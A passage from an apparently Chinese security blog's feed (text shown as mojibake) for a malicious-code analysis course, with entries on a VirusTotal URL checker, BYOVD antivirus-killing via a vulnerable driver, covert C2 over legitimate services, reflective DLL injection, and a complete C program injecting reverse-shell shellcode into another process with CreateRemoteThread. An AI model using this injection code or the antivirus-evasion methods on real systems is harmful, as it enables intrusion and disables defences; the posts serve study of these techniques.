class="line">        <span class="built_in">print</span>(<span class="string">&quot;   - www.example.com (ä¼šè‡ªåŠ¨æ·»åŠ https://)&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># æ£€æŸ¥URL</span></span><br><span class="line">        status, malicious_count, details = check_url_with_virustotal(url)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ‰“å°ç»“æœ</span></span><br><span class="line">        print_result(status, malicious_count, details)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¿”å›é€€å‡ºç ï¼ˆ0=å®‰å…¨ï¼Œ1=æ¶æ„ï¼‰</span></span><br><span class="line">        sys.exit(<span class="number">0</span> <span class="keyword">if</span> status == <span class="string">&#x27;safe&#x27;</span> <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nâŒ é”™è¯¯: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nå¯èƒ½çš„åŸå› :&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  1. APIå¯†é’¥æ— æ•ˆæˆ–å·²è¿‡æœŸ&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  2. ç½‘ç»œè¿æ¥é—®é¢˜&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  3. VirusTotal APIé™åˆ¶ï¼ˆå…è´¹ç‰ˆæœ‰è¯·æ±‚é¢‘ç‡é™åˆ¶ï¼‰&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  4. URLæ ¼å¼ä¸æ­£ç¡®&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251112015000909.png" alt="image-20251112015000909"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    
    <category term="æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹-Shellcodeåå°„DLLæ³¨å…¥</title>
    <link href="https://250wuyifan.github.io/2025/11/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-Shellcode%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5/"/>
    <id>https://250wuyifan.github.io/2025/11/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-Shellcode%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5/</id>
    <published>2025-11-11T14:08:53.000Z</published>
    <updated>2025-11-11T14:40:46.662Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰ä»‹ç»äº†åå°„DLLæ³¨å…¥ã€‚Shellcodeçš„ç›®çš„ä¹Ÿæ˜¯ä¸è®©DLLæ–‡ä»¶è½åœ°ï¼Œç”šè‡³è¿™ä¸ªç›´æ¥å¯ä»¥è®©dllå˜æˆshellcodeåŠ è½½åˆ°èµ„æºä¸­ï¼Œç¼–è¯‘ä¹‹åç›´æ¥ä¸Šçº¿ã€‚</p><p>å‚è€ƒä»£ç ï¼š<a href="https://github.com/monoxgas/sRDI">https://github.com/monoxgas/sRDI</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¹‹å‰ä»‹ç»äº†åå°„DLLæ³¨å…¥ã€‚Shellcodeçš„ç›®çš„ä¹Ÿæ˜¯ä¸è®©DLLæ–‡ä»¶è½åœ°ï¼Œç”šè‡³è¿™ä¸ªç›´æ¥å¯ä»¥è®©dllå˜æˆshellcodeåŠ è½½åˆ°èµ„æºä¸­ï¼Œç¼–è¯‘ä¹‹åç›´æ¥ä¸Šçº¿ã€‚&lt;/p&gt;
&lt;p&gt;å‚è€ƒä»£ç ï¼š&lt;a href=&quot;https://github.com/monoxgas/sRDI&quot;&gt;https</summary>
      
    
    
    
    
    <category term="æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹-ä¸€æ¬¡æœ€æ–°å·¥å…·çš„BYOVDåˆ†æ</title>
    <link href="https://250wuyifan.github.io/2025/11/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E4%B8%80%E6%AC%A1%E6%9C%80%E6%96%B0%E5%B7%A5%E5%85%B7%E7%9A%84BYOVD%E5%88%86%E6%9E%90/"/>
    <id>https://250wuyifan.github.io/2025/11/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E4%B8%80%E6%AC%A1%E6%9C%80%E6%96%B0%E5%B7%A5%E5%85%B7%E7%9A%84BYOVD%E5%88%86%E6%9E%90/</id>
    <published>2025-11-11T14:05:56.000Z</published>
    <updated>2025-11-11T14:11:08.713Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨twitterä¸Šåˆ·çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†ä¸€ä¸ªæ¨æ–‡</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111213429900.png" alt="image-20251111213429900"></p><p>ä¸€çœ¼å°±çŸ¥é“æ˜¯ç”¨äº†é©±åŠ¨è¿›è¡Œå…³é—­çš„æ€æ¯’ï¼Œæ‰€ä»¥ç°åœ¨çš„æ€è·¯æ˜¯æ‹¿åˆ°é©±åŠ¨ï¼Œè¿›è¡Œåˆ†æï¼Œç„¶åå†™ç”¨æˆ·æ€å°±è¡Œï¼Œè¿™æ˜¯BYOVDåŸºæœ¬çš„æ€è·¯ï¼Œä¸æ˜¯è¯»å†™å°±æ˜¯å…³é—­å‡½æ•°ã€‚</p><p>è‡ªç„¶å°±æ˜¯åƒæ–¹ç™¾è®¡çš„æ‹¿åˆ°äº†é©±åŠ¨</p><p>è®©AIç»™æˆ‘å†™äº†ä¸€ä¸‹å¦‚ä½•è°ƒç”¨ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/bc92acfcb92975c96fdf3a63a890d855.png" alt="bc92acfcb92975c96fdf3a63a890d855"></p><p>IDAåˆ†æèµ·æ¥ä¹Ÿæ˜¯å·¨ç®€å•ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111215908963.png" alt="image-20251111215908963"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111215931160.png" alt="image-20251111215931160"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111215948716.png" alt="image-20251111215948716"></p><p>ä¸€è·¯æŒ‰Xå°±å®Œäº‹äº†</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111220016635.png" alt="image-20251111220016635"></p><p>ä¸€è·¯è·Ÿåˆ°è¿™é‡Œå‘ç°ä¸‹é¢æœ‰ä¸ªIofCompleteRequest((PIRP)a2, 0);é‚£ä¹ˆæˆ‘ä»¬å°±æƒ³åˆ°äº†è¿™å°±æ˜¯ä¸€ä¸ªåˆ†å‘å‡½æ•°çš„åœ°æ–¹ã€‚</p><p>é‚£åªè¦çœ‹çœ‹è°ƒç”¨å·æ˜¯å¤šå°‘ï¼Œæ³¨å†Œè®¾å¤‡å¯¹è±¡ï¼Œç„¶åç”¨æˆ·æ€å‘å‡ºè¯·æ±‚ç»™å†…æ ¸å°±è¡Œäº†ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111220049915.png" alt="image-20251111220049915"></p><p>å†™ä»£ç å°±å¥½äº†ã€‚</p><p>æµ‹è¯•360ä¸»åŠ¨é˜²å¾¡</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/18b647a3d6ad020a85757559bd11316f.png" alt="18b647a3d6ad020a85757559bd11316f"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/55939e6a814df19a752fc038d29313e1.png" alt="55939e6a814df19a752fc038d29313e1"></p><p>ä½†æ˜¯ä½†æ˜¯LOLdriveå…¶å®å·²ç»è®°è½½äº†ï¼Œæ²¡åŠæ³•</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111220515611.png" alt="image-20251111220515611"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åœ¨twitterä¸Šåˆ·çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†ä¸€ä¸ªæ¨æ–‡&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251111213429900.png&quot; alt=</summary>
      
    
    
    
    
    <category term="æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹-åˆæ³•æœåŠ¡çš„éšè”½C2</title>
    <link href="https://250wuyifan.github.io/2025/11/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E5%90%88%E6%B3%95%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%9A%90%E8%94%BDC2/"/>
    <id>https://250wuyifan.github.io/2025/11/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E5%90%88%E6%B3%95%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%9A%90%E8%94%BDC2/</id>
    <published>2025-11-08T08:52:51.000Z</published>
    <updated>2025-11-08T12:11:06.152Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://xz.aliyun.com/news/16258">https://xz.aliyun.com/news/16258</a></p><p>åˆ©ç”¨åˆæ³•æœåŠ¡è¿›è¡ŒC2ï¼Œæµé‡ä¸Šéƒ½æ˜¯ç™½åå•ï¼Œè¿™æ ·åœ¨æµé‡ä¸Šå°±ä¸ä¼šè¢«åˆ¤æ–­ä¸ºæ¶æ„æµé‡ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251108200758912.png" alt="image-20251108200758912"></p><p>ä¸»è¦è¿˜æ˜¯åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ï¼Œåªä¸è¿‡è¦è·å–æ‰§è¡Œçš„å‘½ä»¤ï¼Œå†æŠŠæ‰§è¡Œåçš„ç»“æœé€šè¿‡æ¥å£å‘ç»™è¿™ä¸ªé€šè®¯å·¥å…·ã€‚</p><h1 id="ä¸€äº›é—®é¢˜"><a href="#ä¸€äº›é—®é¢˜" class="headerlink" title="ä¸€äº›é—®é¢˜"></a>ä¸€äº›é—®é¢˜</h1><p>1.ç»è¿‡æµ‹è¯•ï¼Œä½¿ç”¨æ²™ç®±ç›´æ¥å°±å¯ä»¥æŠ“åˆ°httpè¯·æ±‚ï¼Œä½¿ç”¨çš„tokenä¹Ÿè¢«æŠ“ä¸‹æ¥ï¼Œè¿™ä¸ªåœ°æ–¹å¦‚æœè¦ä¿æŠ¤C2çš„è¯éœ€è¦åšä¸€ä¸ªå¤„ç†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‚è€ƒæ–‡ç« &quot;&gt;&lt;a href=&quot;#å‚è€ƒæ–‡ç« &quot; class=&quot;headerlink&quot; title=&quot;å‚è€ƒæ–‡ç« &quot;&gt;&lt;/a&gt;å‚è€ƒæ–‡ç« &lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/news/16258&quot;&gt;https://xz.aliyun.c</summary>
      
    
    
    
    
    <category term="æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹-åå°„DLLæ³¨å…¥</title>
    <link href="https://250wuyifan.github.io/2025/11/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5/"/>
    <id>https://250wuyifan.github.io/2025/11/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5/</id>
    <published>2025-11-07T16:12:47.000Z</published>
    <updated>2025-11-08T08:56:14.410Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://www.cnblogs.com/fdxsec/p/18300826">https://www.cnblogs.com/fdxsec/p/18300826</a></p><h1 id="å‰ç½®çŸ¥è¯†ç‚¹"><a href="#å‰ç½®çŸ¥è¯†ç‚¹" class="headerlink" title="å‰ç½®çŸ¥è¯†ç‚¹"></a>å‰ç½®çŸ¥è¯†ç‚¹</h1><p>PEæ–‡ä»¶ç»“æ„ã€‚</p><p>PEB</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‚è€ƒæ–‡ç« &quot;&gt;&lt;a href=&quot;#å‚è€ƒæ–‡ç« &quot; class=&quot;headerlink&quot; title=&quot;å‚è€ƒæ–‡ç« &quot;&gt;&lt;/a&gt;å‚è€ƒæ–‡ç« &lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/fdxsec/p/18300826&quot;&gt;https://ww</summary>
      
    
    
    
    
    <category term="æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹-CreateRemoteThread Shellcode æ³¨å…¥</title>
    <link href="https://250wuyifan.github.io/2025/11/05/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-CreateRemoteThread-Shellcode-%E6%B3%A8%E5%85%A5/"/>
    <id>https://250wuyifan.github.io/2025/11/05/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-CreateRemoteThread-Shellcode-%E6%B3%A8%E5%85%A5/</id>
    <published>2025-11-04T16:02:52.000Z</published>
    <updated>2025-11-07T11:56:08.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="è¿œç¨‹çº¿ç¨‹shellcodeæ³¨å…¥"><a href="#è¿œç¨‹çº¿ç¨‹shellcodeæ³¨å…¥" class="headerlink" title="è¿œç¨‹çº¿ç¨‹shellcodeæ³¨å…¥"></a>è¿œç¨‹çº¿ç¨‹shellcodeæ³¨å…¥</h1><p>æœ¬èŠ‚ä»‹ç»å°† Shellcode æ³¨å…¥æœ¬åœ°è¿›ç¨‹çš„æ–¹æ³•ï¼Œ<strong>Shellcode</strong> çš„æœ¬è´¨æ˜¯ä¸€æ®µæœºå™¨å¯æ‰§è¡Œçš„äºŒè¿›åˆ¶ä»£ç ã€‚å®ƒçš„åå­—æ¥æºäºæœ€åˆçš„ç›®çš„ï¼šæ‰§è¡Œä¸€æ®µèƒ½â€œå¯åŠ¨ä¸€ä¸ªå‘½ä»¤è¡Œ shellâ€çš„ä»£ç ã€‚æˆ‘ä»¬æ³¨å…¥çš„ç›®çš„å°±æ˜¯è®©æŸä¸ªè¿›ç¨‹æ‰§è¡Œæˆ‘ä»¬çš„shellcodeè¿›è¡Œä¸Šçº¿ã€‚</p><p>ç”Ÿæˆç”¨äºåå‘ shell çš„ shellcodeï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251107005233443.png" alt="image-20251107005233443"></p><h1 id="æœ¬åœ°åŠ è½½"><a href="#æœ¬åœ°åŠ è½½" class="headerlink" title="æœ¬åœ°åŠ è½½"></a>æœ¬åœ°åŠ è½½</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251107005310192.png" alt="image-20251107005310192"></p><h1 id="è¿œç¨‹çº¿ç¨‹æ³¨å…¥"><a href="#è¿œç¨‹çº¿ç¨‹æ³¨å…¥" class="headerlink" title="è¿œç¨‹çº¿ç¨‹æ³¨å…¥"></a>è¿œç¨‹çº¿ç¨‹æ³¨å…¥</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line">        <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\...&quot;</span>;</span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    DWORD threadId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. æ£€æŸ¥å‚æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] ç”¨æ³•: %s &lt;ç›®æ ‡è¿›ç¨‹PID&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD targetPID = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] ç›®æ ‡è¿›ç¨‹PID: %d\n&quot;</span>, targetPID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. æ‰“å¼€ç›®æ ‡è¿›ç¨‹</span></span><br><span class="line">    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);</span><br><span class="line">    <span class="keyword">if</span> (processHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] æ— æ³•æ‰“å¼€è¿›ç¨‹! é”™è¯¯ä»£ç : %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] æç¤º: è¯·ç¡®ä¿ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œä¸”ç›®æ ‡è¿›ç¨‹å­˜åœ¨\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] æˆåŠŸæ‰“å¼€ç›®æ ‡è¿›ç¨‹\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ†é…å†…å­˜</span></span><br><span class="line">    remoteBuffer = VirtualAllocEx(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode),</span><br><span class="line">        (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (remoteBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] å†…å­˜åˆ†é…å¤±è´¥! é”™è¯¯ä»£ç : %d\n&quot;</span>, GetLastError());</span><br><span class="line">        CloseHandle(processHandle);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] åœ¨ç›®æ ‡è¿›ç¨‹åˆ†é…å†…å­˜: 0x%p\n&quot;</span>, remoteBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å†™å…¥shellcode</span></span><br><span class="line">    SIZE_T bytesWritten;</span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, <span class="keyword">sizeof</span>(shellcode), &amp;bytesWritten)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] å†™å…¥å†…å­˜å¤±è´¥! é”™è¯¯ä»£ç : %d\n&quot;</span>, GetLastError());</span><br><span class="line">        VirtualFreeEx(processHandle, remoteBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(processHandle);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] æˆåŠŸå†™å…¥ %zu å­—èŠ‚ shellcode\n&quot;</span>, bytesWritten);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. åˆ›å»ºè¿œç¨‹çº¿ç¨‹</span></span><br><span class="line">    remoteThread = CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">        (LPTHREAD_START_ROUTINE)remoteBuffer,</span><br><span class="line">        <span class="literal">NULL</span>, <span class="number">0</span>, &amp;threadId);</span><br><span class="line">    <span class="keyword">if</span> (remoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] åˆ›å»ºè¿œç¨‹çº¿ç¨‹å¤±è´¥! é”™è¯¯ä»£ç : %d\n&quot;</span>, GetLastError());</span><br><span class="line">        VirtualFreeEx(processHandle, remoteBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(processHandle);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] æˆåŠŸåˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œçº¿ç¨‹ID: %d\n&quot;</span>, threadId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. ç­‰å¾…çº¿ç¨‹æ‰§è¡Œï¼ˆå¯é€‰ï¼‰</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] ç­‰å¾…shellcodeæ‰§è¡Œ...\n&quot;</span>);</span><br><span class="line">    WaitForSingleObject(remoteThread, <span class="number">1000</span>);  <span class="comment">// ç­‰å¾…1ç§’</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. æ¸…ç†èµ„æº</span></span><br><span class="line">    CloseHandle(remoteThread);</span><br><span class="line">    CloseHandle(processHandle);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] æ³¨å…¥å®Œæˆ!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251107012202658.png" alt="image-20251107012202658"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;è¿œç¨‹çº¿ç¨‹shellcodeæ³¨å…¥&quot;&gt;&lt;a href=&quot;#è¿œç¨‹çº¿ç¨‹shellcodeæ³¨å…¥&quot; class=&quot;headerlink&quot; title=&quot;è¿œç¨‹çº¿ç¨‹shellcodeæ³¨å…¥&quot;&gt;&lt;/a&gt;è¿œç¨‹çº¿ç¨‹shellcodeæ³¨å…¥&lt;/h1&gt;&lt;p&gt;æœ¬èŠ‚ä»‹ç»å°† Shellcode æ³¨å…¥</summary>
      
    
    
    
    
    <category term="æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹-DLL Injection</title>
    <link href="https://250wuyifan.github.io/2025/11/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-DLL-Injection/"/>
    <id>https://250wuyifan.github.io/2025/11/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-DLL-Injection/</id>
    <published>2025-11-04T14:09:56.000Z</published>
    <updated>2025-11-06T14:34:17.646Z</updated>
    
